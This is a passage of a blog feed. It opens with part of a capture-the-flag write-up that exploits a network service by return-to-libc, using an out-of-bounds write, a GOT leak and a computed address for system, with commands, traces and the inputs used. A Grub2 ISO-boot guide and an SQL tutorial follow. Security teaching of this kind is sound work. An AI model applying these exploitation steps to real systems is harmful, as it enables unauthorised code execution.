<p>So <strong>let’s state our idea</strong>: we will override a pointer to a function which is called later; the function will be called whenever the <code>math</code> function is called.</p>
<h2 id="first-poc">First <a href="http://en.wikipedia.org/wiki/Proof_of_concept">PoC</a></h2>
<pre><code>$ telnet localhost 31337
[...]
math
You haven&#39;t set a mode yet!
func1
Setting mode to ADDITION
write
Input position to write to:
-2147483634
Input numeric value to write:
286331153
Value at position -2147483634: 286331153
math
Connection closed by foreign host.
$</code></pre>
<p>Meanwhile, back at the castle.</p>
<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
[pid  4710] recv(4, &quot;\n&quot;, 1, 0)         = 1
[pid  4710] send(4, &quot;Value at position -2147483634: 2&quot;..., 41, 0) = 41
[pid  4710] read(4, &quot;m&quot;, 1)             = 1
[pid  4710] read(4, &quot;a&quot;, 1)             = 1
[pid  4710] read(4, &quot;t&quot;, 1)             = 1
[pid  4710] read(4, &quot;h&quot;, 1)             = 1
[pid  4710] read(4, &quot;\r&quot;, 1)            = 1
[pid  4710] read(4, &quot;\n&quot;, 1)            = 1
[pid  4710] --- SIGSEGV (Segmentation fault) @ 0 (0) ---
Process 4710 detached
$</code></pre>
<p>OK, we’ve got our segmentation fault. Let’s see what was the last instruction pointer.</p>
<pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f /home/back2skool/core 
[...]
Core was generated by `./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0x11111111 in ?? ()
(gdb) </code></pre>
<p>Neat! But what are those numbers? We wrote at position <strong>-2147483634</strong> value <strong>286331153</strong>. The second number is the instruction pointer at which we want to jump with the <code>math</code> function. The first number is computed as follows * the base of our buffer (values) is at a fixed address 0x804c040 * the address at which we want to write is 0x804c078 * we need to write at position values+0x38 * giving a positive index (0x38/4) will give an upper bound error * the negative index is -(2^31 - (0x38/4)) == <strong>-2147483634</strong> * you can test this by computing 2^33 + 0x804c040-4*(2^31 - (0x38/4)) - because of the way the buffer is addressed (4 bytes values, <a href="http://en.wikipedia.org/wiki/Addressing_mode#Scaled">scaled addressing</a>) the overflow is ignored and the index value <em>wraps</em> around. We need to do <em>wrap</em> around only when we try to access a value above the base address of the vector.</p>
<p>The instruction pointer is the value that we wrote, 0x11111111 in decimal is <strong>286331153</strong>, so we’ve managed to modify the flow of the program by doing a write, and we’ve managed to do so in a predictable way.</p>
<h2 id="second-poc">Second PoC</h2>
<p>We are in the following state: we’ve managed to make our program to jump at any location. But <strong>where</strong> to jump? Because we don’t have any possibility of injecting code, we should rely on the available code. Available code means, our code and the dynamic libraries code which are mapped in our address space.</p>
<p>Let’s inspect again our binary to see what is used from shared libraries.</p>
<pre><code>$ nm -D -u ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
         w __gmon_start__
         U __libc_start_main U __stack_chk_fail U accept U atoi U bind
         U chdir U close U err U exit U fork U free U getpwnam U htonl
         U htons U listen U perror U read U recv U send U setgid
         U setgroups U setsockopt U setuid U signal U socket U vasprintf
$ </code></pre>
<p>Hmm, nothing useful, nothing to execute, nothing to modify the mappings. But hey, if you have access to those functions from libc and because the loader maps the libc to our address space then it means that we have access to other functions from libc, the problem is that we don’t know where they are. A wild <strong>idea appears</strong>, if we knew where one of the function from libc is, we can compute the rest of them by adding some offsets. There are two problems with this idea: <strong>how do we find the offset of a used function</strong> and <strong>how do we compute the offset of an unused function</strong>.</p>
<ul>
<li><p>finding the address of a used function is <strong>simple</strong>, we can use the GOT and read the value of the pointer which has been already filled in by the loader. Because of the lazy linking, we only have to be careful to choose a function which has been previously called. We will choose <code>recv</code> for this purpose.</p>
<pre><code>$ objdump -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  | grep -A2 recv@plt
08048980 &lt;recv@plt&gt;:
 8048980:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</code></pre></li>
</ul>
<p><strong>0x804bfc0</strong> is the GOT entry for <code>recv</code> function.</p>
<ul>
<li><p>finding the relative offset of the function that we want to jump to (e.g. <code>system</code>) is <strong>difficult</strong>. This offset depends on the version of libc that is used on the target system. To make things simple, we will focus first on exploiting locally - meaning that we have access to our libc file. To compute the offset we only have to find the function entries in libc.</p>
<pre><code>$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep &#39; recv@&#39;
  1124: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep &#39; system@&#39;
  1398: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
$ echo $((0x00039100-0x000cebf0))
-613104</code></pre></li>
</ul>
<p>The offset is -613104, <strong>note</strong> that it depends on the version of libc, hence the exploit isn’t too reliable. Let’s focus though on exploiting locally and postpone the computation of the remote offset. We will write at the same address as in PoC1 but we will write the value of <code>system</code> function i.e. address_of_recv_function+OFFSET.</p>
<pre><code>$ telnet localhost 31337
read
Input position to read from:
-32
Value at position -32: -1217696784
write
Input position to write to:
-2147483634
Input numeric value to write:
-1218309888
Value at position -2147483634: -1218309888
math
Result of math: -1</code></pre>
<p>Reading from <strong>-32</strong> it’s equivalent of reading -32*4 bytes before our buffer. 0x804c040-32*4 is 0x804bfc0, this is the <code>recv</code> GOT entry. <strong>-1218309888</strong> is -1217696784-613104.</p>
<p>Hey, it didn’t crashed, that’s a plus! Meanwhile, back at the castle.</p>
<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
[pid  4901] send(4, &quot;Value at position -2147483634: -&quot;..., 43, 0) = 43
[pid  4901] read(4, &quot;m&quot;, 1)             = 1
[pid  4901] read(4, &quot;a&quot;, 1)             = 1
[pid  4901] read(4, &quot;t&quot;, 1)             = 1
[pid  4901] read(4, &quot;h&quot;, 1)             = 1
[pid  4901] read(4, &quot;\r&quot;, 1)            = 1
[pid  4901] read(4, &quot;\n&quot;, 1)            = 1
[...]
[pid  4902] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;], [/* 31 vars */]) = 0
[pid  4902] brk(0)                      = 0x9a04000
[...]</code></pre>
<p>We successfully <strong>called execve</strong>!</p>
<h2 id="parameters-to-execve">Parameters to execve</h2>
<p>We are able to run <code>execve</code> but we don’t control the parameters … yet. Let’s see with what parameters <code>execve</code> is called.</p>
<pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
Reading symbols from /root/back2skool-3fbcd46db37c50ad52675294f5667909d1f...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child 
(gdb) catch syscall execve 
Catchpoint 1 (syscall &#39;execve&#39; [11])
(gdb) r
[...]
Catchpoint 1 (call to syscall &#39;execve&#39;), 0xb7fe2424 in __kernel_vsyscall ()
(gdb) info registers 
eax            0xffffffda	-38
ecx            0xbffff3b4	-1073744972
edx            0xbffff5ac	-1073744468
ebx            0xb7fa5a5a	-1208329638
[...]
(gdb) x/s $ebx
0xb7fa5a5a:	 &quot;/bin/sh&quot;
(gdb) x/5x $ecx
0xbffff3b4:	0xb7fa5a5f	0xb7fa5a57	0x0804c040	0x00000000
0xbffff3c4:	0xb7ead180
(gdb) x/s ((char **)$ecx)[0]
0xb7fa5a5f:	 &quot;sh&quot;
(gdb) x/s ((char **)$ecx)[1]
0xb7fa5a57:	 &quot;-c&quot;
(gdb) x/s ((char **)$ecx)[2]
0x804c040 &lt;values&gt;:	 &quot;&quot;
(gdb) </code></pre>
<p>Because we’re using <code>system</code> function the first parameters are set accordingly (<code>sh -c</code>) but the actual command (<code>(char **)$ecx)[2]</code>) is empty. You can have a look at <code>execve</code> syscall <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">parameters</a> and the <a href="http://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64">calling convention</a> for it. Here we’re very <strong>lucky</strong>, the command that is passed to system is our buffer with values, the initial table. Let’s recap our approach: * get the address of <code>recv</code> function via GOT * set the pointer of <code>math</code> function to <code>system</code> by adding an offset to <code>recv</code> function address * set the parameters in the workspace table * trigger the exploit by using the <code>math</code> function * profit</p>
<h2 id="getting-some-output">Getting some output</h2>
<p>The only problem was that the communication socket was number 4 and the output went to file descriptor 1, but running the command with <code>&gt;&amp;4 2&gt;&amp;4</code> appended, did the trick for us.</p>
<h2 id="the-offset-the-achilles-heel-of-the-exploit">The offset, the Achilles’ Heel of the exploit</h2>
<p>Well, the exploit worked locally, but remote it didn’t.</p>
<p>Recall that when computing the offset of <code>system</code> function in respect to <code>recv</code> function, we were able to access the libc that was used on the target <code>system</code>. A few ideas appeared:</p>
<ul>
<li>try different offsets by gathering as many libcs as possible from well known distros. After one hour of trying all the libc binaries from Ubuntu I start to wonder if I’m on the right track.</li>
<li>try random values - this didn’t work at all and it was time consuming (I was already tired and my thinking was bad)</li>
<li>get a copy of in use libc - this is a problem, because we cannot do <code>open</code>, in the best case, we might do some <code>send</code> over the socket using as buffer input the libc mapping.</li>
<li>hope for the best, and use another challenge (which we already exploited) and download that libc file and hope that this system has the same one.</li>
<li>try to do a more intelligent search by matching function entries (<code>push %ebp</code>, <code>mov %esp, %ebp</code> etc.), this would require too much work.</li>
<li>use some magical tool/table that I’m not sure it exists.</li>
</ul>
<p>We used a <strong>previous</strong> level and was able to <strong>download</strong> the libc, this libc was identical with the one that was in use by the current challenge, so we were able to compute the offset for the remote system.</p>
<p>I don’t know of any method of doing a reliable return-to-libc attack without knowing the addresses of some functions. Maybe there’s a method of getting all the symbols after knowing the libc base, that would be neat.</p>
<p>The final exploit can be found <a href="res/pwn250.py">here</a>.</p>
<h1 id="conclusion">Conclusion</h1>
<p>We’ve presented a way of doing a return-to-libc attack, even though this is a primitive return-to-libc approach, we used a function from libc. We also had to compute the offset of that function using the address of another function - this makes the exploit unreliable.</p>
<p>In the end, it boils down to have the right skill for using the right tools, it’s nothing fancy.</p>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Tue, 19 Feb 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/ctf-return-to-libc.html</guid>
</item>
<item>
    <title>Grub2 and ISO boot</title>
    <link>http://techblog.rosedu.org/grub2-and-iso-boot.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/grub2-and-iso-boot.html" title="Grub2 and ISO boot">Grub2 and ISO boot</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on October 25, 2012</span>
      by
      <span class="author">Alexandru Juncu</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/grub2.html">grub2</a>, <a href="/tags/bootloader.html">bootloader</a>, <a href="/tags/linux.html">linux</a>, <a href="/tags/kernel.html">kernel</a>, <a href="/tags/iso.html">iso</a>, <a href="/tags/image.html">image</a></span>
      </span>

      <p>Note: This article focuses on Debian based Linux distributions.</p>
<p><strong>Grub2</strong> is the next generation Linux bootloader that is trying to replace the “Legacy” Grub version. It is a complete rewrite of Grub 1 and only lately becoming fully featured compared to the old version and even comes with some new interesting features.</p>
<p>The old Grub’s configuration was rather straightforward, everything being done in a configuration file in the <code>grub</code> directory of the <code>/boot</code> partition (it’s a common practice to have <code>/boot</code> mounted on a separate filesystem). In Debian it was usually <code>/boot/grub/menu.lst</code> and in Red Hat <code>/boot/grub/grub.conf</code> (sometimes one being a symlink to the other).</p>
<p>The configuration file for Grub2 is <code>/boot/grub/grub.cfg</code>. But the file itself should never be modified (not even root has write access). Instead, this file is generated by commands like <code>update-grub2</code>. It is generated based on other configuration files like (in Debian) <code>/etc/default/grub</code>, which has things like global configurations, timers and default settings.</p>
<p>The menu entries for the operating systems themselves are generated based on files in the <code>/etc/grub.d/</code> directory (in Debian). An interesting feature of Grub2 is the fact that these files are actually Bash scripts. OS entries don’t need to be hard coded, but can be scripted. One such script is the <code>10_linux</code> file that detects any new kernel image in the <code>/boot</code> directory and writes a new entry for it without having to manually add it. Manual entries can also be written in these files (usually in the <code>40_custom</code> script file).</p>
<p>An interesting new feature in Grub2 is the possibility to boot from an ISO file. A LiveCD can be stored in an iso file on disk and loaded by grub without having to burn it onto CD or having to boot the normal system first. A menu entry for ISO booting would look like this:</p>
<pre><code>menuentry &quot;Ubuntu LiveCD&quot; {
        loopback loop (hd0,1)/boot/iso/ubuntu-12.04-desktop-i386.iso
        linux (loop)/casper/vmlinuz boot=casper :iso-scan/filename=/boot/iso/ubuntu-12.04-desktop-i386.iso noprompt noeject
        initrd (loop)/casper/initrd.lz
}</code></pre>
<p>Based on the previous ideas, here’s a way to configure grub to make an entry for every .iso file that you have in a specified directory. First, create a directory to store the .iso files (ex. <code>/boot/iso/</code>) and move your Live CDs there.</p>
<p>Next, make a script in the <code>/etc/grub.d/</code> directory. Let’s call it <code>42_iso</code> (the number in front dictates the order in which the scripts are executed).</p>
<pre><code>#!/bin/bash

ISO_DIR=&quot;/boot/iso/&quot;

for iso in $(ls $ISO_DIR*.iso); do
	echo &quot;menuentry \&quot;$iso\&quot; {&quot;
	echo &quot;set isofile=\&quot;$iso\&quot;&quot;
	echo &quot;loopback loop (hd0,1)\$isofile&quot;
	echo &quot;linux (loop)/casper/vmlinuz boot=casper iso-scan/filename=\$isofile noprompt noeject&quot;
	echo &quot;initrd (loop)/casper/initrd.lz&quot;
	echo &quot;}&quot;

done</code></pre>
<p>Don’t forget to give it executable access. Then run the <code>update-grub2</code> command to generate the Grub2 configuration file.</p>
<pre><code>chmod +x /etc/grub.d/42_iso
update-grub2</code></pre>
<p>Thanks to doraz for suggesting ISO booting with Grub.</p>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Thu, 25 Oct 2012 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/grub2-and-iso-boot.html</guid>
</item>
<item>
    <title>The fast-track, hands-on, no-nonsense introduction to SQL</title>
    <link>http://techblog.rosedu.org/sql.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/sql.html" title="The fast-track, hands-on, no-nonsense introduction to SQL">The fast-track, hands-on, no-nonsense introduction to SQL</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on October  5, 2012</span>
      by
      <span class="author">Dan Șerban</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/SQL.html">SQL</a>, <a href="/tags/RDBMS.html">RDBMS</a></span>
      </span>

      <p>Rather than relying on dry explanations of mathematical set theory, this tutorial is organized as a survey of SQL statements and techniques. It is designed to let you infer from examples what SQL is all about as well as the kinds of problems it can help you solve.</p>
<p>The promise of this tutorial is that you invest 30 minutes of your time and it will enable you to “speak” SQL right here, right now.</p>
<p>The uncompromising emphasis here is on raw speed of learning new things.</p>
<h3 id="introduction">Introduction</h3>
<p>SQL is the universal language that allows relational database management systems (RDBMS) to communicate with the outside world.</p>
<p>The easiest way for a developer to become familiar with SQL is by using SQLite, a file-based (serverless) RDBMS.</p>
<h3 id="lets-start-coding-already">Let’s start coding already!</h3>
<p>To check whether you already have SQLite on your GNU/Linux system, open up a terminal and run:</p>
<pre><code>which sqlite3 &amp;&amp; echo &quot;OK - SQLite found&quot;</code></pre>
<p>To install SQLite on Ubuntu, simply run:</p>
<pre><code>sudo apt-get install sqlite3</code></pre>
<p>The first few baby steps when learning SQL are: - creating a new database; - creating a new table inside that database; - populating the table with some data.</p>
<p>First, let’s create a new database. In a terminal, run:</p>
<pre><code>sqlite3 /tmp/dev.db</code></pre>
<p>You should see output similar to this:</p>
<pre><code>SQLite version 3.7.13 2012-06-11 02:05:22
Enter &quot;.help&quot; for instructions
Enter SQL statements terminated with a &quot;;&quot;
sqlite&gt;</code></pre>
<p>At this point, SQLite has created and appropriately formatted a new file, <code>/tmp/dev.db</code>, and is now waiting for you to tell it what to do.</p>
<p>You communicate your intent to SQLite by typing in SQL statements.</p>
<p>As we already mentioned, when we start working on a new database, the first thing we do is create a table.</p>
<p>At the <code>sqlite&gt;</code> prompt, type the following SQL statement:</p>
<p>{% highlight sql %} CREATE TABLE presidencies ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, first_name VARCHAR(255), other_names VARCHAR(255), year_from INTEGER, year_to INTEGER, notes TEXT ); {% endhighlight %}</p>
<p>SQLite does not give any output in response, and that means it has successfully executed the statement.</p>
<p>We now have an empty table called <code>presidencies</code>.</p>
<p>Having an empty table in a database is like having an empty spreadsheet in front of you.</p>
<p>The next step is therefore to populate the table with some data.</p>
<p>We do this by using the <code>INSERT</code> statement. Try this:</p>
<p>{% highlight sql %} INSERT INTO presidencies VALUES ( NULL, “Barack”, “Obama”, 2009, 2012, “Won against John McCain” ); {% endhighlight %}</p>
<p>Again, SQLite is not giving us any response, which means the <code>INSERT</code> statement was successfully executed.</p>
<p>If we now query the contents of the table, we should see the newly inserted row. Try this:</p>
<p>{% highlight sql %} SELECT * FROM presidencies; {% endhighlight %}</p>
<p>The output you should see is this:</p>
<pre><code>1|Barack|Obama|2009|2012|Won against John McCain</code></pre>
<p>As you can probably tell, the output is in the format:</p>
<pre><code>id|first_name|other_names|year_from|year_to|notes</code></pre>
<p>Since we set <code>id</code> to <code>NULL</code> in our <code>INSERT</code> statement and <code>id</code> has the <code>AUTOINCREMENT</code> attribute in the table definition, SQLite assigned the first available positive integer value and stored it as this record’s primary key.</p>
<p>“Primary key” simply means two things: - The developer has communicated his intention to use this field to uniquely identify each row of this table; - The RDBMS will therefore enforce the uniqueness of this key and use this information to optimize its execution of SQL statements against this table.</p>
<p>Let’s put this behavior to the test. Try the same <code>INSERT</code> statement as before, only replace <code>NULL</code> with <code>1</code> (an already existing <code>id</code>):</p>
<p>{% highlight sql %} INSERT INTO presidencies VALUES ( 1, “Barack”, “Obama”, 2009, 2012, “Won against John McCain” ); {% endhighlight %}</p>
<p>The output you should see is:</p>
<pre><code>Error: PRIMARY KEY must be unique</code></pre>
<p>To change a record in the table, we are going to use an <code>UPDATE</code> statement with a precisely targeted <code>WHERE</code> clause:</p>
<p>{% highlight sql %} UPDATE presidencies SET notes = “His campaign slogan was yes-we-can” WHERE id = 1; {% endhighlight %}</p>
<p>Query the whole table again to see the changes:</p>
<p>{% highlight sql %} SELECT * FROM presidencies; {% endhighlight %}</p>
<p>The output you should see is this:</p>
<pre><code>1|Barack|Obama|2009|2012|His campaign slogan was yes-we-can</code></pre>
<p>To remove a record from the table, we are going to use a precisely targeted <code>DELETE</code> statement:</p>
<p>{% highlight sql %} DELETE FROM presidencies WHERE id = 1; {% endhighlight %}</p>
<p>Query the whole table again to verify that it’s empty.</p>
<p>To continue exploring the features of SQL we are going to need a lot more data.</p>
<p>Paste the statements below at the <code>sqlite&gt;</code> prompt:</p>
<p>{% highlight sql %} INSERT INTO presidencies VALUES (NULL, “Theodore”, “Roosevelt”, 1905, 1908, “”); INSERT INTO presidencies VALUES (NULL, “William”, “Taft”, 1909, 1912, “”); INSERT INTO presidencies VALUES (NULL, “Woodrow”, “Wilson”, 1913, 1916, “1st term; WW 1 begins”); INSERT INTO presidencies VALUES (NULL, “Woodrow”, “Wilson”, 1917, 1920, “2nd term; WW 1 ends”); INSERT INTO presidencies VALUES (NULL, “Warren”, “Harding”, 1921, 1922, “”); INSERT INTO presidencies VALUES (NULL, “Calvin”, “Coolidge”, 1923, 1924, “1st term”); INSERT INTO presidencies VALUES (NULL, “Calvin”, “Coolidge”, 1925, 1928, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Herbert”, “Hoover”, 1929, 1932, “”); INSERT INTO presidencies VALUES (NULL, “Franklin”, “D. Roosevelt”, 1933, 1936, “1st term”); INSERT INTO presidencies VALUES (NULL, “Franklin”, “D. Roosevelt”, 1937, 1940, “2nd term; WW 2 begins”); INSERT INTO presidencies VALUES (NULL, “Franklin”, “D. Roosevelt”, 1941, 1944, “3rd term”); INSERT INTO presidencies VALUES (NULL, “Harry”, “Truman”, 1945, 1948, “1st term; WW 2 ends”); INSERT INTO presidencies VALUES (NULL, “Harry”, “Truman”, 1949, 1952, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Dwight”, “Eisenhower”, 1953, 1956, “1st term”); INSERT INTO presidencies VALUES (NULL, “Dwight”, “Eisenhower”, 1957, 1960, “2nd term”); INSERT INTO presidencies VALUES (NULL, “John”, “F. Kennedy”, 1961, 1963, “”); INSERT INTO presidencies VALUES (NULL, “Lyndon”, “Johnson”, 1964, 1964, “Took over when JFK was assassinated”); INSERT INTO presidencies VALUES (NULL, “Lyndon”, “Johnson”, 1965, 1968, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Richard”, “Nixon”, 1969, 1972, “1st term”); INSERT INTO presidencies VALUES (NULL, “Richard”, “Nixon”, 1973, 1974, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Gerald”, “Ford”, 1975, 1976, “”); INSERT INTO presidencies VALUES (NULL, “Jimmy”, “Carter”, 1977, 1980, “”); INSERT INTO presidencies VALUES (NULL, “Ronald”, “Reagan”, 1981, 1984, “1st term”); INSERT INTO presidencies VALUES (NULL, “Ronald”, “Reagan”, 1985, 1988, “2nd term”); INSERT INTO presidencies VALUES (NULL, “George”, “H. W. Bush”, 1989, 1992, “”); INSERT INTO presidencies VALUES (NULL, “Bill”, “Clinton”, 1993, 1996, “1st term”); INSERT INTO presidencies VALUES (NULL, “Bill”, “Clinton”, 1997, 2000, “2nd term”); INSERT INTO presidencies VALUES (NULL, “George”, “W. Bush”, 2001, 2004, “1st term”); INSERT INTO presidencies VALUES (NULL, “George”, “W. Bush”, 2005, 2008, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Barack”, “Obama”, 2009, 2012, “”); {% endhighlight %}</p>
<p>Let’s see how many records our table contains now:</p>
<p>{% highlight sql %} SELECT COUNT(*) FROM presidencies; {% endhighlight %}</p>
<p>The table has 30 rows.</p>
<p>We want to generate a deduplicated list of all persons who held office.</p>
<p>The SQL keyword <code>DISTINCT</code> performs the deduplication magic, and we are going to make use of the SQL text concatenation operator <code>||</code>:</p>
<p>{% highlight sql %} SELECT DISTINCT first_name || ‘’ || other_names AS full_name FROM presidencies; {% endhighlight %}</p>
<p>We want to find out how many presidencies began in the second half of the 20th century.</p>
<p>{% highlight sql %} SELECT COUNT(*) FROM presidencies WHERE year_from BETWEEN 1950 AND 1999; {% endhighlight %}</p>
<p>The answer to that question is 14 records.</p>
<p>In 1941, the surprise attack at Pearl Harbor happened.</p>
<p>We would like to know who was president of the United States at that time.</p>
<p>{% highlight sql %} SELECT * FROM presidencies WHERE 1941 BETWEEN year_from AND year_to; {% endhighlight %}</p>
<p>The expected output:</p>
<pre><code>12|Franklin|D. Roosevelt|1941|1944|3rd term</code></pre>
<p>We stored some notes on when both world wars began and ended. Let’s query that information by asking for all records that contain the string &quot; WW &quot; inside the <code>notes</code> column.</p>
<p>To perform text matching we need to use the <code>LIKE</code> predicate.</p>
<p>Note: The percent sign has wildcard semantics in SQL.</p>
<p>{% highlight sql %} SELECT * FROM presidencies WHERE notes LIKE ‘% WW %’ ORDER BY year_from; {% endhighlight %}</p>
<p>The expected output:</p>
<pre><code>4|Woodrow|Wilson|1913|1916|1st term; WW 1 begins
5|Woodrow|Wilson|1917|1920|2nd term; WW 1 ends
11|Franklin|D. Roosevelt|1937|1940|2nd term; WW 2 begins
13|Harry|Truman|1945|1948|1st term; WW 2 ends</code></pre>
<p>We want a breakdown of how many presidencies were full-term (lasted the full 4 years) versus how many lasted 1 or 2 or 3 years.</p>
<p>That can also be done in SQL, however the syntax is slightly more convoluted.</p>
<p>{% highlight sql %} SELECT 1 + year_to - year_from AS duration, COUNT(*) AS cnt FROM presidencies GROUP BY duration ORDER BY cnt DESC; {% endhighlight %}</p>
<p>The expected output:</p>
<pre><code>4|24
2|4
1|1
3|1</code></pre>
<p>That means there were 24 presidencies which lasted the full 4 years, 4 which lasted 2 years etc.</p>
<p><strong>Important side note</strong></p>
<p>Being able to get predictable, consistent performance is an important part of software development, and there are some performance considerations to take into account when using <code>WHERE</code> clauses.</p>
<p>The database engine performs these <code>WHERE</code> lookups significantly faster when it can rely on indexes.</p>
<p>Let’s say we know ahead of time that the most frequent queries are going to filter by <code>year_from</code> and <code>year_to</code>.</p>
<p>In that case we need to create indexes on both fields:</p>
<p>{% highlight sql %} CREATE INDEX index_on_year_from ON presidencies (year_from); CREATE INDEX index_on_year_to ON presidencies (year_to); {% endhighlight %}</p>
<p>Indexes do not make a big difference on a table with 30 records, but it is recommended to get into the habit of thinking about indexes before SQL execution times start to grow out of control.</p>
<h3 id="foreign-key-relationships-the-one-to-many-case">Foreign key relationships: the ONE-TO-MANY case</h3>
<p>Let us now explore how we can build database models for information entities which are related to one another.</p>
<p>We are going to use the geographical hierarchy of continents <code>-&gt;</code> countries <code>-&gt;</code> cities to illustrate this. - A continent has many countries - A country has many cities</p>
<p>Conversely: - A city belongs to only one country - A country belongs to only one continent</p>
<p>To create tables for each of the three information entities, run the following commands:</p>
<p>{% highlight sql %} CREATE TABLE continents ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, continent_name VARCHAR(255) ); CREATE TABLE countries ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, continent_id INTEGER NOT NULL, country_name VARCHAR(255) ); CREATE TABLE cities ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, country_id INTEGER NOT NULL, city_name VARCHAR(255) ); {% endhighlight %}</p>
<p>Note: SQL experts will notice something is missing from the table definitions above. I have deliberately chosen not to cover foreign key constraints in this beginner-level tutorial in order not to place too much of a cognitive burden on the reader.</p>
<p>Let’s populate these tables with some data I have prepared for you in a file.</p>
<p>Quit SQLite with Ctrl-D, download and inspect the file as shown below:</p>
<pre><code>wget -O /tmp/geography.sql http://dserban.github.com/introduction-to-sql/geography.sql
less /tmp/geography.sql</code></pre>
<p>Load the data into our database <code>dev.db</code> (this operation may take a while on slower computers):</p>
<pre><code>sqlite3 /tmp/dev.db &lt; /tmp/geography.sql</code></pre>
<p>Now open the database again and let’s write some queries.</p>
<pre><code>sqlite3 /tmp/dev.db</code></pre>
<p>The query:</p>
<p>{% highlight sql %} SELECT * FROM continents; {% endhighlight %}</p>
<p>behaves the way you expect.</p>
<p>Next, go ahead and run the query below, and see what happens:</p>
<p>{% highlight sql %} SELECT * FROM continents AS c1, continents AS c2; {% endhighlight %}</p>
<p>The above is definitely a valid SQL statement, and I’m just showing it to you in order for you to get comfortable with the idea that SQL statements may reference more than one database table, and if you reference the same table twice, the output will be the cartesian product of the table’s row set with itself.</p>
<p>Next, try this:</p>
<p>{% highlight sql %} SELECT country_name, continent_name FROM countries, continents WHERE countries.continent_id = continents.id ORDER BY country_name; {% endhighlight %}</p>
<p>What we just did is formally called “traversing a foreign key relationship”.</p>
<p>We retrieved some records from the <code>countries</code> table, found some “pointers” in the <code>continent_id</code> column, went to the <code>continents</code> table, retrieved the continent descriptions pertaining to those pointers, and then brought back those results and associated them with each row in the <code>countries</code> table.</p>
<p>Congratulations, you have just learned about the “R” in “RDBMS”, this is what we mean by “relational”.</p>
<p>Notice one thing: the query above will start suffering from performance issues for tables beyond a certain size.</p>
<p>Before we go on, we want to take care of performance-by-design.</p>
<p>The lookups which happen during foreign key relationship traversal would be much more efficient when supported by the appropriate indexes.</p>
<p>Let’s create indexes on those foreign key columns.</p>
<p>{% highlight sql %} CREATE INDEX index_on_country_id ON cities (country_id); CREATE INDEX index_on_continent_id ON countries (continent_id); {% endhighlight %}</p>
<p>Moreover, <code>country_name</code> and <code>city_name</code> are also worth indexing, since in the future we are very likely to need to locate records based on them.</p>
<p>{% highlight sql %} CREATE INDEX index_on_city_name ON cities (city_name); CREATE INDEX index_on_country_name ON countries (country_name); {% endhighlight %}</p>
<p>Let us now write a query that performs a three-way join:</p>
<p>{% highlight sql %} SELECT city_name, country_name, continent_name FROM cities, countries, continents WHERE cities.country_id = countries.id AND countries.continent_id = continents.id ORDER BY city_name; {% endhighlight %}</p>
<p>In order to avoid repeated typing of complex queries, SQL allows us to store a given <code>SELECT</code> statement under a specific name.</p>
<p>The resulting database object is called a view.</p>
<p>Let’s create a view for the previous <code>SELECT</code> statement:</p>
<p>{% highlight sql %} CREATE VIEW augmented_cities AS SELECT city_name, country_name, continent_name FROM cities, countries, continents WHERE cities.country_id = countries.id AND countries.continent_id = continents.id; {% endhighlight %}</p>
<p>Using the newly created view, we can more comfortably find out all of the information about e.g. the city of London which our database has to offer:</p>
<p>{% highlight sql %} SELECT * FROM augmented_cities WHERE city_name = ‘London’; {% endhighlight %}</p>
<p>The output:</p>
<pre><code>London|United Kingdom|Europe</code></pre>
<p>Next, let’s look at an example of a subquery. Try this:</p>
<p>{% highlight sql %} SELECT continent_name, how_many_countries FROM continents, (SELECT continent_id, COUNT(*) AS how_many_countries FROM countries GROUP BY continent_id) AS breakdows WHERE continents.id = breakdows.continent_id; {% endhighlight %}</p>
<p>The output:</p>
<pre><code>North America|4
South America|9
Europe|32
Africa|15
Asia|17
Oceania|2</code></pre>
<p>What we did here is we joined a real table (<code>continents</code>) with a virtual one called a subquery (the result of a <code>SELECT</code> statement).</p>
<p>We can do this because SQL doesn’t really join tables, it joins rectangular result sets consisting of rows and columns.</p>
<p>Let’s store this query in a view, we are going to make use of it in a future tutorial.</p>
